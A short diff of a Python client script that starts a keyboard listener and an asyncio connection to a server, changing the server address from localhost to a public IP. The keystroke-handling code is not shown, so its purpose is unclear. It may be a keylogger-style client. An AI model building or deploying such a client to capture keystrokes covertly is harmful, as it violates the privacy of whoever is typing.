@@ -46,7 +46,6 @@ async def main(serverIP, serverPort_P):
     except:
         print("An error occurred")
 
-
 def on_press(key):
     global unlock_input
     try:
@@ -66,10 +65,9 @@ class Client:
         listener.start()
         asyncio.run(main(self.serverIP, self.serverPort_P))
 
-
 if __name__ == '__main__':
 
-    client = Client('127.0.0.1', 6455)
+    client = Client("25.105.194.153", 6455)
     client.run()
 
 
